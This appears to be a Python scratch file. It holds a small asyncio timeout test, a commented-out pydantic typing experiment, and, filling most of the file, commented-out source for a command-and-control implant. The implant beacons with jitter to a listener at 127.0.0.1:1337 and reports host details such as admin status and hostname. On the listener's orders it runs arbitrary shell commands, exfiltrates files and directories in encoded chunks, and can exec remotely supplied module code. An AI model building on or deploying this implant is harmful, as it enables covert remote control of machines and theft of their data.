import asyncio


async def wait_me():
    raise ZeroDivisionError
    await asyncio.sleep(1)


async def waiter():
    await asyncio.wait_for(wait_me(), timeout=2)


asyncio.run(waiter())


# from pydantic import BaseModel, ValidationError
# from typing import get_type_hints
#
# Primitive = str | int | float | bool
# PrimitiveCollection = list[Primitive] | dict[str, Primitive]
# JSON = Primitive | list["JSON"] | dict[str, "JSON"]
# JSONObject = dict[str, Primitive | list["JSON"] | dict[str, "JSON"]]
# PrimitiveType = type[str] | type[int] | type[float] | type[bool]
#
#
# class User(BaseModel):
#     parameter: JSONObject
#
#
# try:
#     User(
#         parameter={"test": "test"},
#     )
# except ValidationError as exc:
#     print(get_type_hints(User)[exc.errors()[0]["loc"][0]])


# import base64
# import ctypes
# import json
# import locale
# import logging
# import os
# import platform
# import random
# import socket
# import subprocess
# import time
# import urllib.error
# import urllib.request
# import zlib
#
# REMOTE_HOST = "127.0.0.1"
# REMOTE_PORT = 1337
# SLEEP_TIME = 1.0
# SLEEP_TIME_JITTER = 0.5
# TASKS_URL_PATHS = ["/tasks"]
# RESULTS_URL_PATHS = ["/results"]
# REGISTRATION_URL_PATHS = ["/register"]
#
#
# def shell_capability(arguments):
#     command = arguments["command"]
#     timeout = arguments["timeout"]
#     blind = arguments["blind"]
#     shell = arguments["shell"]
#     expand = arguments["expand"]
#
#     if shell and not os.path.exists(shell):
#         return {
#             "success": False,
#             "message": (
#                 f"Failed to execute command '{command}'. The provided shell binary "
#                 "file path does not exist."
#             ),
#             "data": {},
#         }
#
#     if command[:3].lstrip().lower() == "cd ":
#         directory_to_change_to = command.replace("cd ", "", 1)
#         if expand:
#             directory_to_change_to = os.path.expandvars(directory_to_change_to)
#         try:
#             os.chdir(directory_to_change_to)
#         except FileNotFoundError:
#             return {
#                 "success": False,
#                 "message": (
#                     f"Failed to change to directory '{directory_to_change_to}'. "
#                     "Directory does not exist."
#                 ),
#                 "data": {},
#             }
#         except NotADirectoryError:
#             return {
#                 "success": False,
#                 "message": (
#                     f"Failed to change to directory '{directory_to_change_to}'. Path "
#                     "is not a directory."
#                 ),
#                 "data": {},
#             }
#         return {
#             "success": True,
#             "message": f"Changed to directory '{directory_to_change_to}'",
#             "data": {},
#         }
#     else:
#         if platform.system() == "Windows" and shell is None:
#             if os.path.exists(
#                 "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
#             ):
#                 shell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
#             else:
#                 shell = "C:\\Windows\\System32\\cmd.exe"
#
#         if blind:
#             subprocess.Popen(
#                 command,
#                 shell=True,
#                 executable=shell,
#             )
#             output = f"Executed command '{command}' blind."
#         else:
#             try:
#                 output = subprocess.run(
#                     command,
#                     shell=True,
#                     capture_output=True,
#                     timeout=timeout,
#                     executable=shell,
#                 )
#             except subprocess.TimeoutExpired:
#                 return {
#                     "success": False,
#                     "message": (
#                         f"Failed to execute command '{command}'. Command timed out "
#                         f"after {timeout} second(s)."
#                     ),
#                     "data": {},
#                 }
#
#             output = (output.stdout + output.stderr).decode("utf-8", errors="ignore")
#
#         return {
#             "success": True,
#             "message": output,
#             "data": {},
#         }
#
#
# def ping_capability(_arguments):
#     return {
#         "success": True,
#         "message": "",
#         "data": {},
#     }
#
#
# def sleep_capability(arguments):
#     return {
#         "success": True,
#         "message": f"Agent is sleeping for {arguments["duration"]} seconds...",
#         "data": {},
#     }
#
#
# def disconnect_capability(arguments):
#     return {
#         "success": True,
#         "message": (
#             f"Agent is disconnecting and waiting {arguments["duration"]} second(s) "
#             "before attempting to reconnect..."
#         ),
#         "data": {},
#     }
#
#
# def kill_capability(_arguments):
#     return {
#         "success": True,
#         "message": f"Agent is killing itself...",
#         "data": {},
#     }
#
#
# def delay_capability(arguments):
#     return {
#         "success": True,
#         "message": (
#             f"Agent is updating delay to '{arguments["duration"]}' second(s) with a "
#             f"jitter of '{arguments["jitter"]}'"
#         ),
#         "data": {},
#     }
#
#
# def download_capability(arguments):
#     source = arguments["source"]
#     recursive = arguments["recursive"]
#     chunk_size = arguments["chunk_size"]
#     ignore_empty_dirs = arguments["ignore_empty_dirs"]
#     compression_level = arguments["compression_level"]
#     expand = arguments["expand"]
#
#     def read_file_chunks(file_path, chunk_size):
#         try:
#             with open(file_path, "rb") as file:
#                 while True:
#                     chunk = file.read(chunk_size)
#                     if not chunk:
#                         break
#                     yield chunk
#         except PermissionError:
#             yield {
#                 "success": False,
#                 "message": (
#                     "Failed to download file. Permission denied when attempting to "
#                     f"read file '{file_path}'."
#                 ),
#                 "data": {},
#             }
#
#     def walk_directory(directory_path, recursive):
#         for root, directories, files in os.walk(directory_path):
#             for file in files:
#                 yield os.path.join(root, file)
#             for directory in directories:
#                 yield os.path.join(root, directory)
#             if not recursive:
#                 break
#
#     def generate_agent_result_messages_for_file(
#         file_path,
#         chunk_size,
#         compression_level,
#     ):
#         yield {
#             "success": True,
#             "message": "",
#             "data": {
#                 "response_type": "start_of_file",
#                 "resolved_source_path": os.path.abspath(file_path),
#                 "is_directory": False,
#                 "file_size": os.path.getsize(file_path),
#             },
#         }
#
#         for file_chunk in read_file_chunks(file_path, chunk_size):
#             if compression_level:
#                 file_chunk = zlib.compress(file_chunk, compression_level)
#             yield {
#                 "success": True,
#                 "message": "",
#                 "data": {
#                     "response_type": "file_chunk",
#                     "file_chunk": base64.b64encode(file_chunk).decode(),
#                 },
#             }
#
#         yield {
#             "success": True,
#             "message": "",
#             "data": {
#                 "response_type": "end_of_file",
#             },
#         }
#
#     def generate_agent_result_messages_for_directory(
#         directory_path,
#         chunk_size,
#         compression_level,
#         recursive,
#     ):
#         yield {
#             "success": True,
#             "message": "",
#             "data": {
#                 "response_type": "start_of_directory",
#                 "resolved_source_path": os.path.abspath(directory_path),
#                 "is_directory": True,
#             },
#         }
#
#         for path in walk_directory(directory_path, recursive):
#             if os.path.isdir(path):
#                 if not os.listdir(path) and ignore_empty_dirs:
#                     continue
#                 yield {
#                     "success": True,
#                     "message": "",
#                     "data": {
#                         "response_type": "directory",
#                         "directory_path": os.path.relpath(path, directory_path),
#                     },
#                 }
#             else:
#                 relative_file_path = os.path.relpath(path, directory_path)
#                 agent_result_messages_generator = (
#                     generate_agent_result_messages_for_file(
#                         path,
#                         chunk_size,
#                         compression_level,
#                     )
#                 )
#                 _discarded_header = next(agent_result_messages_generator)
#                 yield {
#                     "success": True,
#                     "message": "",
#                     "data": {
#                         "response_type": "start_of_directory_file",
#                         "relative_file_path": relative_file_path,
#                         "file_size": os.path.getsize(path),
#                     },
#                 }
#                 for agent_result_message in agent_result_messages_generator:
#                     if agent_result_message["data"]["response_type"] == "end_of_file":
#                         continue
#                     yield agent_result_message
#
#         yield {
#             "success": True,
#             "message": "",
#             "data": {
#                 "response_type": "end_of_directory",
#             },
#         }
#
#     if expand:
#         source = os.path.expandvars(source)
#
#     if not os.path.exists(source):
#         return {
#             "success": False,
#             "message": (
#                 f"Failed to download file/directory. The provided path '{source}' does "
#                 "not exist."
#             ),
#             "data": {},
#         }
#
#     if os.path.isdir(source):
#         for agent_result_message in generate_agent_result_messages_for_directory(
#             source,
#             chunk_size,
#             compression_level,
#             recursive,
#         ):
#             yield agent_result_message
#     else:
#         for agent_result_message in generate_agent_result_messages_for_file(
#             source,
#             chunk_size,
#             compression_level,
#         ):
#             yield agent_result_message
#
#
# class ModuleLoader:
#     def __init__(self):
#         self._loaded_modules = {}
#
#     def load_module(self, module_name, module_source_code):
#         if module_name in self._loaded_modules:
#             return {
#                 "success": False,
#                 "message": (
#                     f"Failed to load module. Module '{module_name}' is already loaded."
#                 ),
#                 "data": {},
#             }
#
#         try:
#             module_namespace = {}
#             exec(module_source_code, module_namespace)
#         except Exception as exc:
#             return {
#                 "success": False,
#                 "message": f"Failed to load module. {exc}",
#                 "data": {},
#             }
#
#         try:
#             self._loaded_modules[module_name] = module_namespace["Module"]()
#         except KeyError:
#             return {
#                 "success": False,
#                 "message": "Failed to load module. Module class not found in module",
#                 "data": {},
#             }
#
#         return {
#             "success": True,
#             "message": f"Loaded module '{module_name}'.",
#             "data": {},
#         }
#
#     def unload_module(self, module_name: str):
#         if module_name in self._loaded_modules:
#             del self._loaded_modules[module_name]
#             return {
#                 "success": True,
#                 "message": f"Unloaded module '{module_name}'.",
#                 "data": {},
#             }
#         else:
#             return {
#                 "success": False,
#                 "message": (
#                     f"Failed to unload module. Module '{module_name}' is not currently "
#                     "loaded."
#                 ),
#                 "data": {},
#             }
#
#     def reload_module(self, module_name, module_source_code):
#         if module_name not in self._loaded_modules:
#             return {
#                 "success": False,
#                 "message": (
#                     f"Failed to reload module. Module '{module_name}' is not currently "
#                     "loaded."
#                 ),
#                 "data": {},
#             }
#
#         try:
#             module_namespace = {}
#             exec(module_source_code, module_namespace)
#         except Exception as exc:
#             return {
#                 "success": False,
#                 "message": f"Failed to reload module. {exc}",
#                 "data": {},
#             }
#
#         try:
#             self._loaded_modules[module_name] = module_namespace["Module"]()
#         except KeyError:
#             return {
#                 "success": False,
#                 "message": "Failed to reload module. Module class not found in module",
#                 "data": {},
#             }
#
#         return {
#             "success": True,
#             "message": f"Reloaded module '{module_name}'.",
#             "data": {},
#         }
#
#     def run_module(self, module_name, arguments, connection):
#         self._loaded_modules[module_name].run_module(arguments, connection)
#
#     def get_loaded_module_names(self):
#         return list(self._loaded_modules.keys())
#
#
# class Connection:
#     def __init__(
#         self,
#         remote_host,
#         remote_port,
#         sleep_time,
#         sleep_time_jitter,
#         tasks_url_paths,
#         results_url_paths,
#         registration_url_paths,
#     ):
#         self.remote_host = remote_host
#         self.remote_port = remote_port
#         self.sleep_time = sleep_time
#         self.sleep_time_jitter = sleep_time_jitter
#         self.tasks_url_paths = tasks_url_paths
#         self.results_url_paths = results_url_paths
#         self.registration_url_paths = registration_url_paths
#
#         self._listener_base_url = f"http://{self.remote_host}:{self.remote_port}"
#         self._agent_id = None
#
#     def register_with_listener(self, agent_data):
#         register_request = urllib.request.Request(
#             f"{self._listener_base_url}{random.choice(self.registration_url_paths)}",
#             data=json.dumps(agent_data).encode(),
#             method="POST",
#         )
#         agent_id_response = urllib.request.urlopen(register_request)
#         agent_id = json.loads(agent_id_response.read().decode())["agent_id"]
#         self._agent_id = agent_id
#         return agent_id
#
#     def get_tasks_from_listener(self):
#         if self._agent_id is None:
#             raise RuntimeError("Agent not registered with listener")
#
#         tasks_request = urllib.request.Request(
#             f"{self._listener_base_url}{random.choice(self.tasks_url_paths)}",
#             headers={"Cookie": self._agent_id},
#         )
#         tasks_response = urllib.request.urlopen(tasks_request)
#         tasks = json.loads(tasks_response.read().decode())
#         return tasks
#
#     def post_results_to_listener(self, task_id, success, message, data):
#         if self._agent_id is None:
#             raise RuntimeError("Agent not registered with listener")
#
#         post_results_request = urllib.request.Request(
#             f"{self._listener_base_url}{random.choice(self.results_url_paths)}",
#             data=json.dumps(
#                 {
#                     "agent_id": self._agent_id,
#                     "task_id": task_id,
#                     "result": {
#                         "success": success,
#                         "message": message,
#                         "data": data,
#                     },
#                 },
#             ).encode(),
#             method="POST",
#         )
#         urllib.request.urlopen(post_results_request)
#
#
# class Agent:
#     def __init__(
#         self,
#         connection,
#         module_loader,
#     ):
#         self.connection = connection
#         self.module_loader = module_loader
#
#     def _sleep(self):
#         jitter_range = self.connection.sleep_time * self.connection.sleep_time_jitter
#         random_jitter = random.uniform(-jitter_range, jitter_range)
#         time_to_sleep = self.connection.sleep_time + random_jitter
#         if time_to_sleep < 0:
#             time_to_sleep = 0
#         time.sleep(time_to_sleep)
#
#     def run_agent(self):
#         def get_is_admin():
#             try:
#                 return os.getuid() == 0
#             except AttributeError:
#                 return ctypes.windll.shell32.IsUserAnAdmin() != 0
#
#         def get_local_host_address():
#             test_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             test_socket.settimeout(0)
#             try:
#                 test_socket.connect(("10.254.254.254", 1))
#                 local_host_address = test_socket.getsockname()[0]
#             except Exception:
#                 local_host_address = "127.0.0.1"
#             finally:
#                 test_socket.close()
#             return local_host_address
#
#         agent_data_querying_functions = {
#             "is_admin": get_is_admin,
#             "os": lambda: platform.system() + " " + platform.release(),
#             "version": platform.version,
#             "arch": platform.machine,
#             "pid": os.getpid,
#             "locale": lambda: " ".join(locale.getlocale()),
#             "local_host_address": get_local_host_address,
#             "hostname": platform.node,
#         }
#         agent_data = {}
#         for data_name, data_function in agent_data_querying_functions.items():
#             try:
#                 agent_data[data_name] = data_function()
#             except Exception as exc:
#                 logging.error(exc)
#
#         while True:
#             try:
#                 while True:
#                     try:
#                         self.connection.register_with_listener(agent_data)
#                         break
#                     except urllib.error.URLError:
#                         self._sleep()
#
#                 while True:
#                     tasks = self.connection.get_tasks_from_listener()
#                     logging.debug(tasks)
#                     for task in tasks:
#                         if task["command"] == "shell":
#                             result = shell_capability(task["arguments"])
#                             self.connection.post_results_to_listener(
#                                 task["task_id"],
#                                 **result,
#                             )
#                         elif task["command"] == "ping":
#                             result = ping_capability(task["arguments"])
#                             self.connection.post_results_to_listener(
#                                 task["task_id"],
#                                 **result,
#                             )
#                         elif task["command"] == "sleep":
#                             result = sleep_capability(task["arguments"])
#                             self.connection.post_results_to_listener(
#                                 task["task_id"],
#                                 **result,
#                             )
#                             time.sleep(task["arguments"]["duration"])
#                             continue
#                         elif task["command"] == "disconnect":
#                             result = disconnect_capability(task["arguments"])
#                             self.connection.post_results_to_listener(
#                                 task["task_id"],
#                                 **result,
#                             )
#                             break
#                         elif task["command"] == "kill":
#                             result = kill_capability(task["arguments"])
#                             self.connection.post_results_to_listener(
#                                 task["task_id"],
#                                 **result,
#                             )
#                             exit()
#                         elif task["command"] == "delay":
#                             result = delay_capability(task["arguments"])
#                             self.connection.post_results_to_listener(
#                                 task["task_id"],
#                                 **result,
#                             )
#                             self.connection.sleep_time = task["arguments"]["duration"]
#                             self.connection.sleep_time_jitter = task["arguments"][
#                                 "jitter"
#                             ]
#                         elif task["command"] == "download":
#                             for result in download_capability(task["arguments"]):
#                                 self.connection.post_results_to_listener(
#                                     task["task_id"],
#                                     **result,
#                                 )
#                                 self._sleep()
#                             continue
#                         # elif task["command"] == "load_module":
#                         #     module_name = task["arguments"][0]
#                         #     module_source_code = task["arguments"][1]
#                         #     result = self.module_loader.load_module(
#                         #         module_name, module_source_code
#                         #     )
#                         # elif task["command"] == "unload_module":
#                         #     module_name = task["arguments"][0]
#                         #     result = self.module_loader.unload_module(module_name)
#                         #     self.connection.post_results_to_listener(task["task_id"], **result)
#                         # elif task["command"] == "reload_module":
#                         #     module_name = task["arguments"][0]
#                         #     result = self.module_loader.unload_module(module_name)
#                         #     self.connection.post_results_to_listener(task["task_id"], **result)
#                         # else:
#                         #     module_name = task["command"]
#                         #     arguments = task["arguments"]
#                         #     self.module_loader.run_module(
#                         #         module_name, arguments, self.connection
#                         #     )
#
#                     self._sleep()
#             except Exception as exc:
#                 logging.error(exc)
#                 self._sleep()
#
#
# def main():
#     logging.getLogger().setLevel(logging.DEBUG)
#     connection = Connection(
#         remote_host=REMOTE_HOST,
#         remote_port=REMOTE_PORT,
#         sleep_time=SLEEP_TIME,
#         sleep_time_jitter=SLEEP_TIME_JITTER,
#         tasks_url_paths=TASKS_URL_PATHS,
#         results_url_paths=RESULTS_URL_PATHS,
#         registration_url_paths=REGISTRATION_URL_PATHS,
#     )
#     module_loader = ModuleLoader()
#     agent = Agent(connection, module_loader)
#     agent.run_agent()
#
#
# if __name__ == "__main__":
#     main()
